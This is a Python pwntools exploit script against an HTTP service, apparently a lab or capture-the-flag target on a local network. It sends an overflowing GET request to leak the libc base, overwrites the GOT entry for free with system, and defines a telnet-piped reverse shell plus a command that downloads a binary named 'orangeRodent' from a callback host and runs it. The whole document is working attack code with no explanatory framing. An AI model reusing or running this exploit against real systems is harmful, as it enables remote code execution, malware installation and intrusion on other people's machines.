import socket
from pwn import *
import time

pattern = cyclic(0x1000) 
def leakLibcBase(sock) -> int:
    # Vulnerablility in processing of a HTTP request
    payload = b"GET"
    payload += b"\xAA"*(1045) 
    payload += p64(0x4019d0)
    payload += p64(0xffffc4469b88) 
    payload += b'A'*8 
    payload += p64(0x401048)
    payload += b"A" * 24
    payload += p64(0x400efc)
    payload += b"B"*8
    payload += p64(0x00401800)
    payload += p64(0x00402280)
    payload += b'A'* 4
    payload += p64(0x4)
    payload += b"B" * 260
    payload += p64(0x400efc)
    payload += p64(0x4021c0)
    payload += b"ABCD"
    payload += p64(0x4)
    payload += b"A"*20
    payload += p64(0x400fb0)
    payload += p64(0x4022d8)
    payload += b"ABCD"
    payload += p64(4)
    payload += b"A"*60
    payload += p64(0x4021c0)
    payload += b" /status"
    payload += b" HTTP/1.1"
    payload += "\r\n".encode("ascii")*2 
    sock.send(payload)

    # Recv first HTTP response
    sock.recvuntil(b"error\r\n")
    sock.recvuntil(b"\r\n\r\n")

    ATOI_TO_LIBC_BASE_OFFSET = 0x3ba88
    # Recv HTTP response with atoi address
    buff = sock.recvuntil(b" status Error")
    buff = buff[:buff.rfind(b' status')]
    buff = buff + (b"\x00" * (8-(len(buff)%8)))
    addr = u64(buff)
    return addr-ATOI_TO_LIBC_BASE_OFFSET

def sendRevShellSysPayload(sock, callback_ip: str, callback_port_stdin: str, callback_port_stdout: str):
    payload = f"telnet {callback_ip} {callback_port_stdin} | /bin/sh | telnet {callback_ip} {callback_port_stdout} #"
    sock.send(payload.encode('ascii')+b"D")

def sendScript(sock, script: str):
    payload = f"/bin/sh -c \"{script}\"#"
    sock.send(payload.encode('ascii') + b"D")

def overwriteFreeGot(sock, libcBase: int):
    SYSTEM_OFFSET = 0x472b4
    sys_addr = libcBase + SYSTEM_OFFSET
    sock.send(p64(sys_addr)+b"D")

def exploit(ip: str, port: int):
    sock = remote(ip, port)
    log.info("Attempting to leak libc base addr")
    libc = leakLibcBase(sock)
    log.success(f"Leaked libc base addr: {hex(libc)}")
    log.info("Writing reverse shell shell script payload")
    #sendRevShellSysPayload(sock, "172.100.0.1", "4242", "4243")
    sendScript(sock, "wget 172.100.0.1:4242/orangeRodent 2>&1 1>/dev/null; chmod +x orangeRodent; ./orangeRodent;")
    log.info("Overwrting GOT free entry")
    overwriteFreeGot(sock, libc)

if __name__ == "__main__":
    exploit("127.0.0.1", 4200)
